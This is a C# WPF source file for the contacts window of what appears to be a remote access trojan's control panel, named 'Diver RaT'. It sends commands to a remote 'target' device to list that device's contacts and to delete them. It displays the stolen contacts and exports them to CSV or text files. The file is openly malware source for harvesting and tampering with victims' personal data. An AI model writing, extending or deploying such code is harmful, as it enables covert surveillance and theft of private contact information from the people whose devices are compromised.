using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Media;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class ContactsWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private List<ContactItem> _all = new();

        public ContactsWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Contacts - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            _ = RefreshAsync();
        }

        private async System.Threading.Tasks.Task RefreshAsync()
        {
            LoadingOverlay.Visibility = Visibility.Visible;
            StatusText.Text = "Reading contacts...";
            try
            {
                var result = await _server.SendCommandAsync(_device.Id, "LIST_CONTACTS", timeoutMs: 30000);
                if (!result.Success || string.IsNullOrEmpty(result.Result))
                {
                    StatusText.Text = $"Failed: {result.Error}";
                    return;
                }
                var items = new List<ContactItem>();
                try
                {
                    using var doc = JsonDocument.Parse(result.Result);
                    foreach (var e in doc.RootElement.EnumerateArray())
                    {
                        items.Add(new ContactItem
                        {
                            Id = e.TryGetProperty("id", out var i) ? i.GetString() ?? "" : "",
                            Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "",
                            Number = e.TryGetProperty("number", out var p) ? p.GetString() ?? "" : ""
                        });
                    }
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Invalid contact list: {ex.Message}";
                    return;
                }
                _all = items;
                ApplyFilter();
                StatusText.Text = $"{_all.Count} contact(s)  |  updated {DateTime.Now:HH:mm:ss}";
            }
            finally
            {
                LoadingOverlay.Visibility = Visibility.Collapsed;
            }
        }

        private void ApplyFilter()
        {
            var q = SearchBox.Text.Trim();
            if (q.Length == 0) { ContactsGrid.ItemsSource = _all; return; }
            ContactsGrid.ItemsSource = _all.FindAll(i =>
                i.Name.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                i.Number.Contains(q));
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e) => _ = RefreshAsync();

        private void SearchBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e) => ApplyFilter();

        private void ExportButton_Click(object sender, RoutedEventArgs e)
        {
            if (_all.Count == 0) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"contacts_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}",
                Filter = "CSV file|*.csv|Text file|*.txt"
            };
            if (dlg.ShowDialog(this) != true) return;
            var isCsv = dlg.FilterIndex == 1 || dlg.FileName.EndsWith(".csv", StringComparison.OrdinalIgnoreCase);
            var sb = new StringBuilder();
            if (isCsv)
            {
                sb.AppendLine("Name,Number");
                foreach (var c in _all)
                    sb.AppendLine(Csv(c.Name) + "," + Csv(c.Number));
            }
            else
            {
                foreach (var c in _all)
                    sb.AppendLine(c.Name + " | " + c.Number);
            }
            File.WriteAllText(dlg.FileName, sb.ToString());
            StatusText.Text = $"Exported {_all.Count} contact(s) to {dlg.FileName}";
        }

        private void ContactsGrid_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
        {
            if (e.OriginalSource is not DependencyObject source) return;
            var row = FindVisualParent<System.Windows.Controls.DataGridRow>(source);
            if (row?.Item is ContactItem item) ContactsGrid.SelectedItem = item;
        }

        private async void DeleteMenu_Click(object sender, RoutedEventArgs e)
        {
            if (ContactsGrid.SelectedItem is not ContactItem item || string.IsNullOrEmpty(item.Id)) return;
            var ok = MessageBox.Show($"Delete contact '{item.Name}' ({item.Number})?", "Diver RaT - Delete Contact",
                MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes;
            if (!ok) return;

            StatusText.Text = "Deleting contact...";
            var result = await _server.SendCommandAsync(_device.Id, "DELETE_CONTACT",
                new Dictionary<string, string> { ["id"] = item.Id });
            StatusText.Text = result.Success ? $"Deleted: {result.Result}" : $"Delete failed: {result.Error}";
            await RefreshAsync();
        }

        private static string Csv(string s) => "\"" + s.Replace("\"", "\"\"") + "\"";

        private static T? FindVisualParent<T>(DependencyObject? child) where T : DependencyObject
        {
            while (child is not null)
            {
                if (child is T match) return match;
                child = VisualTreeHelper.GetParent(child);
            }
            return null;
        }
    }

    public class ContactItem
    {
        public string Id { get; set; } = "";
        public string Name { get; set; } = "";
        public string Number { get; set; } = "";
    }
}